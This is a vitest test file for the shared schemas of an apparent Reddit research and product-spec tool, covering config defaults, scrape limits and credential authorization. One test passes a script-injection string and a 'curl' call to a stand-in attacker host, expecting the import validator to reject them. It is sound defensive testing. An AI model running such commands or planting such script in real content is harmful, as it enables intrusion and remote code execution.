import { describe, expect, it } from "vitest";

import {
  ConnectionCredentialInputSchema,
  ProductSpecSchema,
  ProjectConfigSchema,
  ResearchPacketSchema,
} from "@/contracts";

describe("shared contracts", () => {
  it("applies safe project defaults and keeps schedules disabled", () => {
    const config = ProjectConfigSchema.parse({
      marketLabel: "Freelancer operations",
      researchContext: "Find recurring invoice collection pain.",
      researchMode: "fixture",
    });

    expect(config).toMatchObject({
      maxDocumentsPerRun: 100,
      hourlyResearchEnabled: false,
      fiveHourPolishEnabled: false,
      workspaceTimeZone: "Asia/Singapore",
    });
  });

  it("normalizes and bounds the persisted Oxylabs Reddit collection scope", () => {
    const config = ProjectConfigSchema.parse({
      marketLabel: "Freelancer operations",
      researchContext: "Find recurring invoice collection pain.",
      researchMode: "live_reddit",
      sourceLabels: ["r/freelance"],
      redditWebScrape: {
        subreddit: "r/freelance",
        keywords: "late invoice",
        sort: "comments",
        time: "month",
        agentCount: 4,
      },
    });

    expect(config.redditWebScrape).toEqual({
      subreddit: "freelance",
      keywords: "late invoice",
      sort: "comments",
      time: "month",
      agentCount: 4,
    });
    expect(() => ProjectConfigSchema.parse({
      ...config,
      redditWebScrape: { ...config.redditWebScrape, agentCount: 9 },
    })).toThrow(/agentCount/i);
  });

  it("requires a written authorization reference for Reddit credentials", () => {
    expect(() =>
      ConnectionCredentialInputSchema.parse({ provider: "reddit", credential: "not-a-real-secret-value" }),
    ).toThrow(/authorization/i);

    expect(
      ConnectionCredentialInputSchema.parse({
        provider: "reddit",
        credential: "not-a-real-secret-value",
        redditAuthorizationReference: "legal-ticket-123",
      }).provider,
    ).toBe("reddit");
  });

  it("rejects all HTML and remote-fetch instructions in imports", () => {
    const base = {
      schemaVersion: "1" as const,
      sourceLabel: "authorized export",
      authorizationReference: "owner-provided-export",
      exportedAt: "2026-07-11T01:00:00.000Z",
    };
    const document = {
      externalId: "doc-1",
      title: "A real workflow problem",
      body: "I repeat this reconciliation task every Friday.",
      attribution: "Authorized fixture",
    };

    expect(ResearchPacketSchema.parse({ ...base, documents: [document] }).documents).toHaveLength(1);
    expect(() =>
      ResearchPacketSchema.parse({ ...base, documents: [{ ...document, body: "<script>alert(1)</script>" }] }),
    ).toThrow(/HTML/i);
    expect(() =>
      ResearchPacketSchema.parse({ ...base, documents: [{ ...document, body: "<p>ordinary markup is still not import data</p>" }] }),
    ).toThrow(/HTML/i);
    expect(() =>
      ResearchPacketSchema.parse({ ...base, documents: [{ ...document, body: "curl https://attacker.invalid/run" }] }),
    ).toThrow(/remote-fetch/i);
    expect(() =>
      ResearchPacketSchema.parse({ ...base, documents: [{ ...document, body: "Download https://attacker.invalid/run" }] }),
    ).toThrow(/remote-fetch/i);
  });

  it("requires evidence-backed product specifications", () => {
    const result = ProductSpecSchema.safeParse({
      productName: "LatePay Copilot",
      oneLinePitch: "Make overdue invoice follow-up calmer and faster.",
      problem: "Freelancers repeatedly recreate invoice reminders and lose cash-flow visibility.",
      targetAudience: "Freelancers who invoice their clients directly.",
      proposedSolution: "Track overdue invoices and draft an owner-reviewed reminder sequence.",
      inScope: ["Invoice status"],
      outOfScope: ["Automatic sending"],
      userStories: [{ actor: "freelancer", need: "track overdue work", outcome: "follow up consistently" }],
      acceptanceCriteria: ["The owner can record an overdue invoice"],
      constraints: [],
      risks: [],
      evidenceIds: [],
    });
    expect(result.success).toBe(false);
  });
});
